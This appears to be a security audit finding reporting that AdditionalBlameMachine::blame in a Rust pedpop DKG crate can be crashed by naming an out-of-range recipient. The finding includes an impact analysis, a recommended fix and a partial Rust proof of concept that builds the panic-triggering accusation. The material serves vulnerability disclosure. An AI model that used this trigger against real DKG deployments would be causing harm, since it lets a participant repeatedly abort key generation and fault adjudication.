### Title
Out-of-range blame participant causes panic - ([File: crypto/dkg/pedpop/src/encryption.rs])

### Summary
`AdditionalBlameMachine::blame` accepts `sender` and `recipient` participant indexes without validating that they belong to the `1..=n` commitment set established by `AdditionalBlameMachine::new`. If the recipient index is absent and a syntactically valid `EncryptedMessage` plus any parseable `EncryptionKeyProof` are supplied, `Decryption::decrypt_with_proof` indexes `self.enc_keys[&decryptor]`, causing an unconditional panic rather than returning an error. [1](#0-0) [2](#0-1) 

### Finding Description
`AdditionalBlameMachine::new` registers decryption keys only for participant indexes `1..=n` and stores them in `Decryption.enc_keys`. [3](#0-2) 

`AdditionalBlameMachine::blame` forwards its caller-controlled `sender` and `recipient` values directly to `blame_internal`, without checking either participant against `n`. [1](#0-0)  `blame_internal` then invokes `decrypt_with_proof` before checking whether the supplied secret share is canonical or valid. [4](#0-3) 

When `proof` is `Some`, `decrypt_with_proof` first verifies the message proof of possession and then indexes `self.enc_keys[&decryptor]`. [5](#0-4)  If `recipient` is `Participant::new(n + 1)` or any other nonzero participant not registered in `enc_keys`, Rust’s `HashMap` indexing panics.

The inputs are externally constructible. `EncryptedMessage::read` and `EncryptionKeyProof::read` deserialize untrusted bytes with canonical point/scalar parsing, but neither associates the message with a participant nor validates a participant’s range. [6](#0-5) [7](#0-6) 

### Impact Explanation
An unprivileged protocol participant can crash a process evaluating blame by submitting an accusation naming a syntactically valid but out-of-range recipient. This aborts the DKG/blame evaluation and can repeatedly prevent completion or fault adjudication wherever the API is exposed to coordinator-supplied blame statements.

The panic occurs before the supplied proof itself is verified. Consequently, the proof only needs to deserialize; it does not need to be cryptographically valid.

### Likelihood Explanation
Likelihood is moderate. Triggering the panic requires:

- Access to the blame-evaluation API.
- A `recipient` participant index greater than the configured `n`, or otherwise absent from `enc_keys`.
- An `EncryptedMessage` whose embedded proof of possession verifies.
- Any parseable `Some(EncryptionKeyProof)`; proof validity is irrelevant because the missing recipient key is indexed first.

`Participant` enforces nonzero indexes, but it does not enforce the upper bound for a particular DKG instance. [8](#0-7) 

### Recommendation
Validate `sender` and `recipient` before calling `blame_internal`, returning an error for any participant outside `1..=n`. `Decryption::decrypt_with_proof` should additionally replace indexing with `get`; an absent key should return `DecryptionError::InvalidProof` or a dedicated `InvalidParticipant` error instead of panicking.

### Proof of Concept
The following demonstrates the reachable panic shape. `commitment_msgs` must contain the normal commitment messages for participants `1..=n`; the malicious accusation then uses recipient `n + 1` with a valid encrypted share and any parseable proof.

```rust
use std::collections::HashMap;

use ciphersuite::Ciphersuite;
use frost::curve::{Curve, Ristretto};
use pedpop::{
  AdditionalBlameMachine, Commitments, EncryptedMessage, EncryptionKeyMessage,
  EncryptionKeyProof, SecretShare,
};
use schnorr::SchnorrSignature;
use transcript::{RecommendedTranscript, Transcript};
use zeroize::Zeroizing;
use rand_core::OsRng;

type C = Ristretto;
type EncKeyMsg = EncryptionKeyMessage<C, Commitments<C>>;
type EncShare = EncryptedMessage<C, SecretShare<<C as Ciphersuite>::F>>;

fn valid_encrypted_share(
  context: [u8; 32],
  sender: dkg::Participant,
  share_repr: <<C as Ciphersuite>::F as ciphersuite::group::ff::PrimeField>::Repr,
) -> EncShare {
  // Reproduce EncryptedMessage's wire format and PoP challenge.
  let key = Zeroizing::new(C::random_nonzero_F(OsRng));
  let public_key = C::generator() * key.as_ref();
  let nonce = Zeroizing::new(C::random_nonzero_F(OsRng));
  let public_nonce = C::generator() * nonce.as_ref();

  let mut transcript =
    RecommendedTranscript::new(b"DKG Encryption Key Proof of Possession v0.2");
  transcript.append_message(b"context", context);
  transcript.domain_separate(b"proof_of_possession");
  transcript.append_message(b"nonce", public_nonce.to_bytes());
  transcript.append_message(b"key", public_key.to_bytes());
  transcript.append_message(b"sender", sender.to_bytes());
  transcript.append_message(b"message", share_repr.as_ref());
  let challenge = C::hash_to_F(
    b"DKG-encryption-proof_of_possession",
    &transcript.challenge(b"schnorr"),
  );

  let pop = SchnorrSignature::<C>::sign(&key, nonce, challenge);

  let mut bytes = Vec::new();
  bytes.extend(public_key.to_bytes().as_ref());
  bytes.extend(pop.serialize());
  bytes.extend(share_repr.as_ref());

  EncShare::read(&mut bytes.as_slice(), /* DKG params */ unimplemented!())
    .unwrap()
}

fn trigger(
  context: [u8; 32],
  n: u16,
  sender: dkg::Participant,
  valid_commitments: HashMap<dkg::Participant, EncKeyMsg>,
  msg: EncShare,
  parseable_proof: EncryptionKeyProof<C>,
) {
  let machine = AdditionalBlameMachine::<C>::new(context, n, valid_commitments)
    .unwrap();
  let invalid_recipient = dkg::Participant::new(n + 1).unwrap();

  // Panics inside decrypt_with_proof at self.enc_keys[&invalid_recipient].
  let _ = machine.blame(sender, invalid_recipient, msg, Some(parseable_proof));
}
```
